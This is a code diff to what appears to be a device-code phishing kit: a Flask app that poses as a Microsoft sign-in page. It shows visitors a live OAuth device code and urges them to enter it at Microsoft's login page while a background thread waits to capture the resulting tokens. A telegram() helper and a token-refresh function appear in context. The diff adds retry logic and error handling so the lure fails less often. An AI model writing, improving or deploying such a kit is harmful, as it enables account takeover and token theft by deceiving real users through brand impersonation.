@@ -32,7 +32,7 @@ def telegram(msg):
     except Exception:
         pass
 
-# The HTML template - now includes the code directly from the server
+# The HTML template - now includes error handling display
 PAGE = """<!doctype html><html><head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width,initial-scale=1'>
 <title>Sign in to your account</title>
@@ -55,16 +55,22 @@ border-radius:4px;text-align:center;margin-top:10px}
 .btn-secondary:hover{background:#f3f2f1}
 .note{font-size:13px;color:#605e5c;margin-top:24px;text-align:center}
 .status{font-size:14px;color:#107c10;margin-top:10px;text-align:center;display:none}
+.error{color:#d13438;font-size:14px;margin-top:10px;text-align:center}
 </style></head><body>
 <div class='card'>
 <div class='logo'>Microsoft</div>
 <h2>Sign in</h2>
+{% if error %}
+<p class='error'>{{ error }}</p>
+<button class='btn' onclick='location.reload()'>Retry</button>
+{% else %}
 <p>To continue, please verify your identity by entering the code below at the Microsoft sign-in page.</p>
 <div class='code-box' id='codeDisplay'>{{ user_code }}</div>
 <button class='btn' onclick='copyAndRedirect()'>Copy Code & Sign In</button>
 <button class='btn btn-secondary' onclick='window.open(\"https://microsoft.com/devicelogin\", \"_blank\")'>Open Login Page Manually</button>
 <p class='note'>Code expires in 15 minutes. Do not close this window.</p>
 <div id='statusMsg' class='status'>Verification successful! Redirecting...</div>
+{% endif %}
 </div>
 <script>
 let sid = "{{ sid }}";
@@ -77,6 +83,7 @@ function copyAndRedirect() {
     });
 }
 // Poll for success
+if (sid) {
 setInterval(async () => {
     try {
         let r = await fetch('/status?sid=' + sid);
@@ -89,6 +96,7 @@ setInterval(async () => {
         }
     } catch(e) {}
 }, 3000);
+}
 </script></body></html>"""
 
 pending = {}
@@ -173,16 +181,29 @@ def get_fresh_token(row):
 
 @app.route("/")
 def home():
-    # Generate device code SERVER-SIDE so it's always ready
+    # Generate device code SERVER-SIDE with retry logic
     try:
-        dc = requests.post(f"{AUTHORITY}/oauth2/v2.0/devicecode",
-            data={"client_id": CLIENT_ID, "scope": SCOPES}, timeout=20).json()
+        # Retry up to 3 times if Microsoft is slow
+        dc = None
+        for i in range(3):
+            try:
+                resp = requests.post(f"{AUTHORITY}/oauth2/v2.0/devicecode",
+                    data={"client_id": CLIENT_ID, "scope": SCOPES}, timeout=10)
+                dc = resp.json()
+                if "user_code" in dc:
+                    break
+            except Exception:
+                time.sleep(2)
+        
+        if not dc or "user_code" not in dc:
+            return render_template_string(PAGE, error="Service busy. Please refresh.", sid="", user_code="")
+
         sid = str(int(time.time()))
         pending[sid] = dc
         Thread(target=watcher, args=(sid, dc), daemon=True).start()
-        return render_template_string(PAGE, user_code=dc["user_code"], sid=sid)
+        return render_template_string(PAGE, user_code=dc["user_code"], sid=sid, error=None)
     except Exception as e:
-        return f"Error initializing: {str(e)}", 500
+        return render_template_string(PAGE, error=f"Connection error. Please try again.", sid="", user_code="")
 
 @app.route("/status")
 def status():
